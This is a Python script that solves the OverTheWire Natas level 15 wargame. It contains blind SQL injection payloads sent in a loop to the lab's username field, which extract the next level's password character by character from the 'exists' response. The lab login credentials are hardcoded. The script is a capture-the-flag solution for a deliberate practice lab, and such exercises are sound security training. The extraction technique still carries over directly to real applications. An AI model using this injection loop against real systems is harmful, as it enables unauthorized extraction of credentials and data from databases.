import sys
import string
import requests

natas15 = "http://natas15.natas.labs.overthewire.org"
auth = ('natas15', '7h15154h3lL0f4p455w0rD')

valid_chars_list = string.letters + string.digits

password = ''
base_string = 'natas16" and password like binary "'

out_form = base_string + password + '_%'
payload=dict(username=out_form)
response = requests.post(natas15, data=payload, auth=auth)
out = response.text

while('exists' in out):
    for ch in valid_chars_list:
        sys.stdout.flush()
        sys.stdout.write(password + ch + '\r')
        out_form = base_string + password + ch + '%'
        payload=dict(username=out_form)
        response = requests.post(natas15, data=payload, auth=auth)
        out = response.text
        if 'exists' in out:
            password = password + ch
            break

    out_form = base_string + password + '_%'
    payload=dict(username=out_form)
    response = requests.post(natas15, data=payload, auth=auth)
    out = response.text
print "Done and done."

exit(0)
